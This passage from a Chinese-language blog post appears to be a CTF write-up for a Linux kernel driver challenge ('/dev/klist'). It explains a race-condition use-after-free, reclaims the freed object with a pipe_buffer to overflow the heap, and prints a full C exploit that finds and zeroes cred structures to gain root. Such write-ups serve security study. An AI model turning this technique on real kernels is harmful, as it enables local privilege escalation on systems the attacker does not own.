  v6 = copy_from_user(&amp;item-&gt;data, addr, size); <span class="comment">/* 从用户缓冲区拷贝数据到内核 */</span></span><br><span class="line">    mutex_var = using_list-&gt;mutex;</span><br><span class="line">    <span class="keyword">if</span> ( v6 ) <span class="comment">/* copy_from_user失败返回没有被拷贝的字节数,成功返回&#x27;0&#x27; */</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_unlockusing_list-&gt;mutex); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_head：获取链表头中的内核数据，返回给用户空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_head</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *item; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  get(g_list); </span><br><span class="line">  item = g_list;</span><br><span class="line">  mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">  v2 = -(__int64)(copy_to_user(addr, item, item-&gt;size + <span class="number">24</span>) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  put(g_list); <span class="comment">/* 漏洞点:put在互斥锁外(没有收到保护) */</span></span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>init_module：初始化驱动程序（绑定 “/dev/klist”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _register_chrdev(<span class="number">137LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;klist&quot;</span>, &amp;list_fops);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>入侵思路：</p>
<ul>
<li>list_head 函数中的 put 在互斥锁外</li>
<li>add_item 函数中的 refcount 被初始化为“1”</li>
</ul>
<p>假如，在 list_head 函数的 get 操作之后，put 操作之前，另一个线程正好创建了一个新节点，把 g_list 赋值为了这个新节点，接下来 put 操作，将 g_list 的 used 减去“1”后发现为“0”，就会释放这个节点，然后却没有把 g_list 指向下一个节点，这就造成了堆的UAF</p>
<ul>
<li>PS：直接使用 remove_item 会导致目标结点脱链，构不成 UAF，即使生成了 pipe_buffer 也没法控制</li>
</ul>
<p>下面是 init 程序，看一下我们拥有哪些权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs cat init </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -nvt tmpfs none /dev</span><br><span class="line">mknod -m 622 /dev/console c 5 1</span><br><span class="line">mknod -m 666 /dev/null c 1 3</span><br><span class="line">mknod -m 666 /dev/zero c 1 5</span><br><span class="line">mknod -m 666 /dev/ptmx c 5 2</span><br><span class="line">mknod -m 666 /dev/tty c 5 0</span><br><span class="line">mknod -m 0660 /dev/ttyS0 c 4 64</span><br><span class="line">mknod -m 444 /dev/random c 1 8</span><br><span class="line">mknod -m 444 /dev/urandom c 1 9</span><br><span class="line">chown root:tty /dev/console </span><br><span class="line">chown root:tty /dev/ptmx # 没有权限打开/dev/ptmx,获取不了tty_struct</span><br><span class="line">chown root:tty /dev/tty</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line">cat /root/signature</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">echo flag&#123;messy_in_kernel&#125; &gt; /flag # 创建flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">insmod /list.ko</span><br><span class="line">mknod /dev/klist c 137 1</span><br><span class="line">chmod a+rw /dev/klist</span><br><span class="line">cat /proc/kallsyms |grep commit_cred</span><br><span class="line">lsmod</span><br><span class="line"><span class="meta">#</span><span class="bash">cat /sys/module/list/sections/.text</span></span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">halt -d 1 -n -f</span><br></pre></td></tr></table></figure>
<ul>
<li>没有权限去使用 tty_struct attack</li>
<li>但是 ha1vk 大佬有一个巧妙的方法就是利用 pipe 管道，在 pipe 创建管道的时候，会申请这样一个结构：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
<ul>
<li>其中，page 是 pipe 存放数据的缓冲区，offset 和 len 是数据的偏移和长度，一开始，offset 和 len都是“0”，当我们 write(pfd[1],buf,0x100) 的时候，offset = 0，len = 0x100</li>
<li>然而，我们注意到，offset 和 len 都是4字节数据，如果把它们拼在一起，凑成8字节，就是 0x10000000000，如果能够与 list_node 的 size 域对应起来，我们就能溢出堆了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> item            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_5)</span><br><span class="line"><span class="number">00000000</span> refcount        dd ?</span><br><span class="line"><span class="number">00000004</span> null            dd ?</span><br><span class="line"><span class="number">00000008</span> size            dq ? <span class="comment">/* item-&gt;size控制着该内核缓冲区的size(将其进行修改) */</span></span><br><span class="line"><span class="number">00000010</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> data            dq ?</span><br><span class="line"><span class="number">00000020</span> item            ends</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>因此，我们一开始申请一个与 pipe_buffer 大小一样的堆，然后利用竞争释放后，创建一个管道，pipe_buffer 就会申请到这里，接下来再 write(pfd[1],buf,0x100)<ul>
<li>作为管道：它的 pipe_buffer-&gt;offset 变为“0”，pipe_buffer-&gt;len 变为“100”</li>
<li>作为结点：它的 item-&gt;size 变为“0x10000000000”，那么我们就能溢出堆了</li>
</ul>
</li>
</ul>
<p>完整exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUFFER_SIZE 0x280 <span class="comment">// pipe_buffer的大小,阅读源码可知</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> fd; <span class="comment">// 驱动的fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开驱动</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/klist&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建节点时需要发送的数据(和驱动程序中的input结构体有关)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">   <span class="keyword">size_t</span> size;</span><br><span class="line">   <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addItem</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">   data.size = size;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   ioctl(fd,<span class="number">0x1337</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeItem</span><span class="params">(<span class="keyword">int64_t</span> index)</span> </span>&#123;</span><br><span class="line">   ioctl(fd,<span class="number">0x1339</span>,index);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectItem</span><span class="params">(<span class="keyword">int64_t</span> index)</span> </span>&#123;</span><br><span class="line">   ioctl(fd,<span class="number">0x1338</span>,index);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listHead</span><span class="params">(<span class="keyword">char</span> *buf)</span> </span>&#123;</span><br><span class="line">   ioctl(fd,<span class="number">0x133A</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listRead</span><span class="params">(<span class="keyword">void</span> *buf,<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">   read(fd,buf,size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listWrite</span><span class="params">(<span class="keyword">void</span> *buf,<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">   write(fd,buf,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否root成功</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkWin</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Rooted in subprocess [%d]\n&quot;</span>,i);</span><br><span class="line">         system(<span class="string">&quot;cat flag&quot;</span>); <span class="comment">// 我们很难getshell</span></span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE PIPE_BUFFER_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[BUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> buf2[BUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> bufA[BUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> bufB[BUF_SIZE];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fillBuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">memset</span>(bufA,<span class="string">&#x27;a&#x27;</span>,BUF_SIZE);</span><br><span class="line">   <span class="built_in">memset</span>(bufB,<span class="string">&#x27;b&#x27;</span>,BUF_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   initFD(); <span class="comment">/* 打开/dev/klist */</span></span><br><span class="line">   fillBuf(); <span class="comment">/* 填充缓冲区 */</span></span><br><span class="line">   addItem(bufA,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 设置该用户缓冲区与内核缓冲区进行交互 */</span></span><br><span class="line">   selectItem(<span class="number">0</span>); <span class="comment">/* 选择指定位置的节点记录到缓冲区里(遍历整个list_unit链表,获取对应index的item结点) */</span></span><br><span class="line">   <span class="keyword">int</span> pid = fork();</span><br><span class="line">   <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]fork error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">200</span>;i++) &#123; <span class="comment">// 增加cred结构被分配到堆下方内存的成功率</span></span><br><span class="line">         <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            checkWin(i+<span class="number">1</span>); <span class="comment">// 子进程结束时,执行checkWin</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// 与主线程的listHead竞争      </span></span><br><span class="line">          <span class="comment">/* 这里不停地进行&quot;绑定&quot;,&quot;选择&quot;,&quot;删除&quot;,&quot;读取&quot;......</span></span><br><span class="line"><span class="comment">          如果在get操作之后,put操作之前,另一个线程正好创建了一个新节点</span></span><br><span class="line"><span class="comment">          那么该新结点就会被put释放(refcount被put减为&#x27;0&#x27;)</span></span><br><span class="line"><span class="comment">          并且另一个线程还是可以操作该新结点 */</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* &lt;--- 假设上述操作执行成功 ---&gt; */</span></span><br><span class="line">         addItem(bufA,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 头结点会被替换,并且被put释放,释放之后的内核缓冲区数据发生改变(不再是&#x27;a&#x27;) */</span></span><br><span class="line">         selectItem(<span class="number">0</span>); <span class="comment">/* 选择头结点 */</span></span><br><span class="line">         removeItem(<span class="number">0</span>); <span class="comment">/* 二次释放,没有影响(只有条件竞争没有成功时,这里才有作用) */</span></span><br><span class="line">         addItem(bufB,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 申请该内核空间为头结点 */</span></span><br><span class="line">         listRead(buf2,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 把头结点中的数据拷贝到buf2(不再是&#x27;a&#x27;) */</span></span><br><span class="line">         <span class="keyword">if</span> (buf2[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;race compete in child process!!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         removeItem(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/* &lt;--- 条件竞争成功 ---&gt; */</span></span><br><span class="line">      sleep(<span class="number">1</span>); </span><br><span class="line">      removeItem(<span class="number">0</span>); <span class="comment">/* 把空间腾出来 */</span></span><br><span class="line">      <span class="keyword">int</span> pfd[<span class="number">2</span>];</span><br><span class="line">      pipe(pfd); <span class="comment">/* 管道的pipe_buffer将会申请到我们能够UAF控制的空间里 */</span></span><br><span class="line">      write(pfd[<span class="number">1</span>],bufB,BUF_SIZE);</span><br><span class="line">      <span class="keyword">size_t</span> memLen = <span class="number">0x1000000</span>;</span><br><span class="line">      <span class="keyword">uint32_t</span> *data = (<span class="keyword">uint32_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,memLen); <span class="comment">/* 申请缓冲区,用于存储数据 */</span></span><br><span class="line">      listRead(data,memLen); <span class="comment">/* 向data读入&#x27;0x1000000&#x27;字节的内核数据 */</span></span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">size_t</span> maxLen = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;memLen/<span class="number">4</span>;i++) &#123;</span><br><span class="line">         <span class="keyword">if</span> (data[i] == UID &amp;&amp; data[i+<span class="number">1</span>] == UID &amp;&amp; data[i+<span class="number">7</span>] == UID) &#123;</span><br><span class="line">             <span class="comment">/* 搜索合法的cred,并将其uid-fsgid都修改为&#x27;0&#x27;,使其具有root权限 */</span></span><br><span class="line">            <span class="built_in">memset</span>(data+i,<span class="number">0</span>,<span class="number">28</span>);</span><br><span class="line">            maxLen = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred!!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (count ++ &gt; <span class="number">2</span>) &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      listWrite(data,maxLen * <span class="number">4</span>);</span><br><span class="line">      checkWin(<span class="number">0</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">// 主线程</span></span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">         listHead(buf);</span><br><span class="line">         listRead(buf,BUF_SIZE<span class="number">-24</span>);</span><br><span class="line">         <span class="keyword">if</span>(buf[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>感受了一下条件竞争打法，学到了不少的东西</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
              <a href="/tags/UAF/" rel="tag"><i class="fa fa-tag"></i> UAF</a>
              <a href="/tags/Race-condition/" rel="tag"><i class="fa fa-tag"></i> Race condition</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/05/24/Machine-Learning-Lab6/" rel="prev" title="Machine-Learning-Lab6">
      <i class="fa fa-chevron-left"></i> Machine-Learning-Lab6
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/05/28/mybuddy/" rel="next" title="mybuddy">
      mybuddy <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">195</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">118</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.6m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">38:50</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
